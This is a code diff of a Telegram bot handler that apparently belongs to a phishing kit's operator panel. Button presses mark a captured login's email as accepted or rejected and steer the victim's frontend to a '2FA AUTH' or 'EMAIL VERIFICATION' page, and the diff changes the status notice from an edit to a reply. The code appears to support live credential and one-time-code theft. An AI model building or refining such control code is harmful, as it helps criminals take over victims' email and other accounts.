@@ -109,23 +109,19 @@ bot.on("callback_query", async (query) => {
       console.log(`   Frontend should receive status: ${action === "page1" ? "accepted1" : action === "page2" ? "accepted2" : "rejected"}`);
       
       // ============================================================================
-      // 📝 EDIT ORIGINAL MESSAGE - Keep original info and add status
+      // 📝 SEND STATUS REPLY MESSAGE
       // ============================================================================
       
-      console.log(`\n   📝 EDITING ORIGINAL MESSAGE...`);
+      console.log(`\n   📢 SENDING STATUS REPLY...`);
       
-      let statusLine = "";
+      let statusMessage = "";
       if (action === "page1") {
-        statusLine = `\n\n✅ <b>ACCEPTED - 2FA AUTH</b> ✅`;
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
-        statusLine = `\n\n✅ <b>ACCEPTED - EMAIL VERIFICATION</b> ✅`;
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "reject") {
-        statusLine = `\n\n❌ <b>REJECTED</b> ❌`;
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       }
-      
-      // Get the original message from storage or reconstruct it
-      const loginData = query.message?.text || "";
-      const editMessage = loginData + statusLine;
       
       try {
         const botToken = process.env.BOT_TOKEN;
@@ -137,26 +133,27 @@ bot.on("callback_query", async (query) => {
           return;
         }
         
-        const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
-        const editResponse = await fetch(editUrl, {
+        // Send reply to the original message
+        const replyUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const replyResponse = await fetch(replyUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
-            message_id: messageId,
-            text: editMessage,
-            parse_mode: "HTML"
+            text: statusMessage,
+            parse_mode: "HTML",
+            reply_to_message_id: messageId  // Reply to original message
           })
         });
         
-        if (editResponse.ok) {
-          console.log(`      ✅ Message edited successfully!`);
-          console.log(`      Status added: ${statusLine}`);
+        if (replyResponse.ok) {
+          console.log(`      ✅ Status reply sent successfully!`);
+          console.log(`      Message: ${statusMessage}`);
         } else {
-          console.error(`      ❌ Failed to edit message`);
+          console.error(`      ❌ Failed to send status reply`);
         }
       } catch (err) {
-        console.error(`      ❌ Error editing message:`, err.message);
+        console.error(`      ❌ Error sending status reply:`, err.message);
       }
     }
 
